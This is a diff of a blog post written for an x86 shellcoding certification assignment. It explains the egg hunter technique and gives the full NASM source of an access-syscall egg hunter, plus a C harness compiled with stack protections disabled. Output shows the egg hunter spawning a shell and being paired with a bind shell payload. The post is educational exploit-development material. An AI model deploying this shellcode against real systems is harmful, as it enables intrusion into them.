@@ -4,7 +4,7 @@ This blog post has been created for completing the requirements of the SecurityT
 Assembly Expert certification:
 * https://www.pentesteracademy.com/course?id=3
 
-Student ID: SLAE-XXXXX
+Student ID: SLAE-1523
 
 ## Assignment#3: What to do ?
 This assignment is divided in 3 steps:
@@ -15,7 +15,7 @@ This assignment is divided in 3 steps:
 Now, let's get to work.
 =
 
-## Step 1: Define and explain an egg hunter
+## 1) Step 1: Define and explain an egg hunter
 The Egg hunting technique is used when there are not enough available consecutive memory locations to insert the shellcode.  Instead, a unique “tag” is prefixed with shellcode. 
 
 When the “Egg hunter” shellcode is executed, it searches for the unique “tag” that was prefixed with the large payload and starts the execution of the payload. 
@@ -31,50 +31,78 @@ In general the egg hunter code needs to follow three rules:
     * In order to avoid sitting idly for minutes while the egg hunter does its task, the methods used to search VAS should be as quick as possible, without violating the first requirement or second requirements without proper justification.
 
 An amazing PDF from "hick.org" describes the whole process and how to use it:
-[Link to PDF](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
+[the PDF can be found here](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
 
-## Step 2: create a working demo of an egg hunter
+## 2) Step 2: create a working demo of an egg hunter
 The egg hunter code is divided in four major parts:
-1) The first step initialize the registers to NULL. 
 
-2) The next step is to perform a page alignment operation on the current pointer that is being validated by doing a bitwise OR operation on the low 16-bits of the current pointer (stored in edx) and then incrementing edx by one. This operation is equivalent to adding 0x1000 to the value in edx. The reason these two operations are separated is to avoid nullbytes inside the shellcode.
-
-3) The third step is to use a systemcall 'access' which will take an address as a parameter and check for us if the memory address is valid. If not the systemcall will return '0xf2' telling us the given address is invalid and then loop until the result returns a valid address.
-
-4) The last step is to check two times the presence of the egg. Because, if we don't do this check a second time the egg hunter code will jump on the wrong memory address and then execute an invalid code.
-
-The egg hunter shellcode:
+The first step initialize the registers to NULL. 
 ```nasm
-global _start
-
-;FIRST PART
 _start:
-	xor ecx, ecx 			;Initialize ecx to NULL
-	mul ecx				;Initilize eax and edx to NULL
+	xor ecx, ecx			;Initialize ecx to NULL
+	mul ecx					;Initilize eax and edx to NULL
+```
 
-;SECOND PART
+The next step is to perform a page alignment operation on the current pointer that is being validated by doing a bitwise OR operation on the low 16-bits of the current pointer (stored in edx) and then incrementing edx by one. This operation is equivalent to adding 0x1000 to the value in edx. The reason these two operations are separated is to avoid nullbytes inside the shellcode.
+
+```nasm
 _firstStep:
 	or dx, 0xfff			;Do a OR on dx register, dx == 0xFFF
 
 _secondStep:
-	inc edx				;Add 1 to edx, edx == 0x1000
+	inc edx					;Add 1 to edx, edx == 0x1000
+```
 
-    ;THIRD PART
-	lea ebx, [edx+0x4]		;ebx now holds the value of edx + 0x4
+The third step is to use a systemcall 'access' which will take an address as a parameter and check for us if the memory address is valid. If not the systemcall will return '0xf2' telling us the given address is invalid and then loop until the result returns a valid address.
+
+```nasm
+lea ebx, [edx+0x4]		;Ebx now holds the value of edx + 0x4
+push byte +0x21			;Push 0x21 on the stack
+pop eax					;Pop 0x21 which is the systemcall value of access
+int 0x80				;Execute systemcall
+cmp al, 0xf2			;Compare the systemcall return value to 0x2f
+jz _firstStep			;If zero, the program will jump to '_firstStep'. Which means the return value is not a valid memory address
+```
+
+The last step is to check two times the presence of the egg. Because, if we don't do this check a second time the egg hunter code will jump on the wrong memory address and then execute an invalid code.
+
+```nasm
+mov eax, 0x50905090		;This instruction will move our egg value inside eax
+mov edi, edx			;Move the address stores in edx to edi
+scasd					;This instruction will compare the value inside eax and edi
+jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
+scasd					;We check a second time the presence of our egg before executing the shellcode
+jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
+jmp edi					;Jump to our payload
+```
+
+You can find the whole code below:
+-
+```nasm
+global _start
+
+_start:
+	xor ecx, ecx			;Initialize ecx to NULL
+	mul ecx					;Initilize eax and edx to NULL
+
+_firstStep:
+	or dx, 0xfff			;Do a OR on dx register, dx == 0xFFF
+
+_secondStep:
+	inc edx					;Add 1 to edx, edx == 0x1000
+	lea ebx, [edx+0x4]		;Ebx now holds the value of edx + 0x4
 	push byte +0x21			;Push 0x21 on the stack
-	pop eax				;Pop 0x21 which is the systemcall value of access
-	int 0x80			;Go for it
+	pop eax					;Pop 0x21 which is the systemcall value of access
+	int 0x80				;Execute systemcall
 	cmp al, 0xf2			;Compare the systemcall return value to 0x2f
 	jz _firstStep			;If zero, the program will jump to '_firstStep'. Which means the return value is not a valid memory address
-
-    ;FOURTH PART
 	mov eax, 0x50905090		;This instruction will move our egg value inside eax
 	mov edi, edx			;Move the address stores in edx to edi
-	scasd				;This instruction will compare the value inside eax and edi
+	scasd					;This instruction will compare the value inside eax and edi
 	jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
-	scasd				;We check a second time the presence of our egg before executing the shellcode
+	scasd					;We check a second time the presence of our egg before executing the shellcode
 	jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
-	jmp edi				;Jump to our payload
+	jmp edi					;Jump to our payload
 ```
 
 Let's compile it:
@@ -107,8 +135,8 @@ unsigned char shellcode[] = \
 void main()
 {
 	// print the length of the shellcodes
-	printf("Egg hunter shellcode Length:  %d\n", strlen(egg_hunter));
-	printf("Egg shellcode Length:  %d\n", strlen(shellcode));
+	printf("Egg hunter shellcode length:  %d\n", strlen(egg_hunter));
+	printf("Shellcode length:  %d\n", strlen(shellcode));
 
 	// convert shellcode to a function
 	int (*ret)() = (int(*)())egg_hunter;
@@ -121,8 +149,8 @@ void main()
 Let's compile it and execute it:
 ```console
 kali@kali:/tmp$ ./test_shellcode 
-Egg hunter shellcode Length:  37
-Egg shellcode Length:  31
+Egg hunter shellcode length:  37
+Egg shellcode length:  31
 $ id
 uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
 $ whoami
@@ -130,7 +158,7 @@ kali
 $ exit
 ```
 
-## Step 3: make the egg hunter easily configurable for different payloads
+## 3) Step 3: make the egg hunter easily configurable for different payloads
 For this part, we will use the bind_shell.nasm code from the assignment#1.
 
 We first need to compile it:
@@ -164,12 +192,13 @@ unsigned char shellcode[] = \
 void main()
 {
 	// print the length of the shellcodes
-	printf("Egg hunter shellcode Length:  %d\n", strlen(egg_hunter));
-	printf("Egg shellcode Length:  %d\n", strlen(shellcode));
+	printf("Egg hunter shellcode length:  %d\n", strlen(egg_hunter));
+	printf("Shellcode length:  %d\n", strlen(shellcode));
 
 	// convert shellcode to a function
 	int (*ret)() = (int(*)())egg_hunter;
-	// execute the shellcode has a function
+
+	// execute the shellcode
 	ret();
 
 }
@@ -177,9 +206,10 @@ void main()
 
 Let's compile the code and execute it:
 ```console
+kali@kali:/tmp$ gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack
 kali@kali:/tmp$ ./test_shellcode 
-Egg hunter shellcode Length:  37
-Egg shellcode Length:  125
+Egg hunter shellcode length:  37
+Egg shellcode length:  125
 
 ```
 
